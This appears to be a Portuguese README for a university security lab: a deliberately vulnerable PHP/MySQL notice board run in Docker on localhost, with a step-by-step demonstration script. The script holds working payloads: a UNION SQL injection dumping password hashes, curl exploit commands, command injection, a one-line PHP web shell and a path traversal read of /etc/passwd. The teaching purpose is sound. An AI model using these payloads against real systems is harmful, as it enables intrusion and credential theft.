# USP Avisos — Parte 1

Mural interno de avisos para o projeto de **Engenharia de Segurança**. O ambiente sobe com **Docker Compose** (Apache, **PHP 5.6.40**, **MySQL 5.7**) e contém **falhas intencionais** para estudo e demonstração.

**Aviso:** use apenas em máquina local (`localhost`). Não publique na internet nem trate como sistema real.


| Item                     | Valor                                               |
| ------------------------ | --------------------------------------------------- |
| URL                      | `http://localhost:8080/login.php`                   |
| Porta no host            | **8080** (MySQL **não** é exposto no host)          |
| Relatório formal (LaTeX) | `relatorio/main.tex` → compilar para PDF            |
| Teste automático         | `./tests/fluxo.sh` → `[OK]`/`[ERRO]` em cada passo; saída 0 se tudo passou |


---



## 1. Instalação e subida

1. **Docker Desktop** instalado e em execução. No Windows, use backend **WSL2**. No Mac, espere o ícone da baleia ficar estável na barra.
2. Abra o terminal **dentro** da pasta do projeto (onde está o `docker-compose.yml`), não na pasta pai.
3. Suba os containers:

```bash
docker compose up -d --build
```

Na primeira vez: download de imagens, build do PHP com `mysqli`, e no **Apple Silicon** o MySQL 5.7 sobe emulado (`platform: linux/amd64` no Compose) — pode levar vários minutos até o `db` ficar **healthy**.

1. Confira:

```bash
docker compose ps
docker compose exec web php -v   # deve mostrar PHP 5.6.40
```

Em `docker compose ps`, espere algo como `0.0.0.0:8080->80/tcp` no serviço **web** e **sem** `0.0.0.0:3306` no host.

1. Abra no navegador: `http://localhost:8080/login.php`



### Parar ou zerar o banco

```bash
docker compose down          # para os containers
docker compose down -v       # apaga o volume do banco (recria tabelas na próxima subida)
```

Sem `-v`, avisos e usuários já criados permanecem. Com `-v`, o MySQL recria tudo a partir de `sql/init.sql` e `site/bin/criar-usuarios.php` roda de novo na subida.

---



## 2. Usuários de demonstração

Senha **igual para todos:** `aviso123`


| Nome   | E-mail             |
| ------ | ------------------ |
| Ivan   | `ivan@avisos.br`   |
| Daniel | `daniel@avisos.br` |
| Pedro  | `pedro@avisos.br`  |


Domínio `avisos.br` é fictício (laboratório).

Conta sugerida para o **fluxo normal** e para a maior parte dos testes: **Ivan**.

---



## 3. O que o site faz (fluxo normal)

Após login:

- **Avisos** — lista e busca por título  
- **Publicar** — novo aviso  
- **Impressora** — teste de alcance de rede (laboratório)  
- **Modelos** — visualização de modelos de aviso  
- **Anexos** — envio de arquivos  
- **Meu usuário** / **Sair**

**Prova rápida:** entre como Ivan, publique um aviso, confira o nome **Ivan** na lista.

---



## 4. Arquitetura (resumo)

- **web:** PHP 5.6.40 + Apache; pasta `site/` montada em `/var/www/html`  
- **db:** MySQL 5.7; hostname `db` na rede interna do Compose  
- Configuração entregue: `apache/000-default.conf`, `mysql/my.cnf`, `docker-compose.yml`, `Dockerfile`  
- SQL inicial: `sql/init.sql`; dump com dados após uso: `sql/dados.sql` (gerado com `mysqldump`, ver relatório)

---



## 5. Falhas intencionais (visão geral)


| Falha                 | Onde                             | Efeito principal                               |
| --------------------- | -------------------------------- | ---------------------------------------------- |
| Autenticação fraca    | `site/login.php`                 | Entrar como outro usuário sem a senha correta  |
| SQL injection (busca) | `site/avisos.php`                | Vazar dados do banco (demo principal da banca) |
| Injeção de comando    | `site/impressora.php`            | Executar comando no servidor (`www-data`)      |
| Upload executável     | `site/anexo.php`, `site/anexos/` | Web shell PHP no servidor                      |
| LFI                   | `site/modelo.php`                | Ler arquivos do disco (ex.: `/etc/passwd`)     |


Detalhes técnicos, impacto, mitigação e referências IEEE: `relatorio/texto/conteudo.tex` (compilar `relatorio/main.tex`).

---



## 6. Roteiro de demonstração (banca / apresentação)

Sem limite de tempo — adapte ao que a banca pedir.

### A — Mostrar o ambiente

```bash
docker compose ps
docker compose exec web php -v
```

Opcional: mostrar `apache/000-default.conf` e `mysql/my.cnf`.

*Frase:* “Mural em Docker, PHP 5.6 e MySQL 5.7, só a porta 8080 no host.”

### B — Tour normal

1. Login: `ivan@avisos.br` / `aviso123`
2. Publicar um aviso e ver **Ivan** na lista
3. Mostrar Impressora, Modelos, Anexos no menu
4. Meu usuário → Sair

*Frase:* “O mural funciona; as falhas são defeitos em cima disso.”

### C — Ataque principal (SQL na busca)

1. Login como Ivan → **Avisos**
2. Colar na busca:

```text
x' UNION SELECT id, email, senha_hash, NOW(), nome FROM usuarios#
```

1. Mostrar e-mails e hashes na tela (a lista normal não mostra isso).
2. Mostrar `buscar_titulo_montado()` em `site/avisos.php` vs consulta preparada em `listar_avisos()`.

*Frase:* “A busca monta o SQL com o que digito; o UNION puxa dados de `usuarios`.”

**Terminal (opcional):**

```bash
jar=$(mktemp)
curl -s -c "$jar" -b "$jar" -o /dev/null \
  -d 'email=ivan@avisos.br&senha=aviso123' \
  http://localhost:8080/login.php
curl -s -c "$jar" -b "$jar" -G --data-urlencode \
  "q=x' UNION SELECT id, email, senha_hash, NOW(), nome FROM usuarios#" \
  http://localhost:8080/avisos.php | less
rm -f "$jar"
```



### D — Login fraco

- E-mail: `daniel@avisos.br`, senha qualquer não vazia (ex.: `123`)  
- **Meu usuário** mostra **Daniel**  
- Código: `login.php` e `definir_sessao_por_email()` em `site/includes/auth.php`



### E — Intrusão pelo PHP (servidor)

**E.1 Impressora** — campo Servidor: `127.0.0.1; id` → saída com `www-data`

```bash
jar=$(mktemp)
curl -s -c "$jar" -b "$jar" -o /dev/null \
  -d 'email=ivan@avisos.br&senha=aviso123' http://localhost:8080/login.php
curl -s -c "$jar" -b "$jar" -d 'host=127.0.0.1;+whoami' \
  http://localhost:8080/impressora.php
rm -f "$jar"
```

**E.2 Anexos** — criar `cmd.php`:

```php
<?php echo shell_exec($_GET["c"]); ?>
```

Enviar em **Anexos**, abrir `http://localhost:8080/anexos/cmd.php?c=id`. Apague o arquivo depois se não quiser deixá-lo no projeto.

**E.3 Modelos (LFI)** — URL:

```text
http://localhost:8080/modelo.php?modelo=../../../../etc/passwd
```



### F — Encerramento

Resumir: login fraco, SQL, comando/upload no servidor, leitura de arquivo. Ambiente só para aula. **Parte 2** (fora deste pacote): alavancagem com outra máquina (rsync/crontab, conforme enunciado).

```bash
docker compose down
```

---



## 7. Testes



### O que faz `tests/fluxo.sh`

É um **ensaio automático antes da banca**: percorre o **fluxo normal** do mural e faz *smoke tests* das **cinco falhas intencionais** do roteiro (SQL na busca, login fraco, Impressora, upload, LFI). Cada verificação imprime **`[OK] descrição`** ou **`[ERRO] descrição`**; no final, resume se o ambiente está pronto.

**Ambiente (se `docker` estiver no PATH):** container `web` rodando e PHP **5.6.40**.

**Fluxo normal:** login HTTP 200; login Ivan; publicar e listar aviso; páginas Impressora, Modelos, Anexos e Meu usuário; e-mail de Ivan no perfil.

**Falhas (demonstração):** `UNION` na busca; Daniel com senha errada; `whoami` na Impressora; upload de `.php` em anexos; LFI de `/etc/passwd`.

O script **não para no primeiro erro**: executa todos os passos e termina com código **0** só se nenhum `[ERRO]` apareceu. Cria um arquivo `anexos/fluxo-probe-<timestamp>.php` no container (web shell de teste); pode apagar depois manualmente.

**Pré-requisito:** containers no ar (`docker compose up -d`) e porta **8080** acessível na máquina onde você roda o script.

```bash
chmod +x tests/fluxo.sh
./tests/fluxo.sh
```

---



## 8. Problemas comuns


| Problema                  | O que fazer                                                                           |
| ------------------------- | ------------------------------------------------------------------------------------- |
| Página não abre           | Docker Desktop ligado? `docker compose ps` com `web` running?                         |
| Login falha               | `docker compose logs web` e `db`; aguardar `db` healthy; `docker compose restart web` |
| Busca SQL vazia           | Está logado? Payload completo com `#` no final?                                       |
| Upload não executa        | Arquivo `.php`? URL `/anexos/nome.php`?                                               |
| Usuários antigos no banco | `docker compose down -v` e subir de novo                                              |


---



## 9. Arquivos principais

```
docker-compose.yml   Dockerfile   docker/entrada.sh
apache/000-default.conf   mysql/my.cnf
sql/init.sql   site/   tests/fluxo.sh
relatorio/main.tex        RELATORIO.md (ponte para o LaTeX)
```

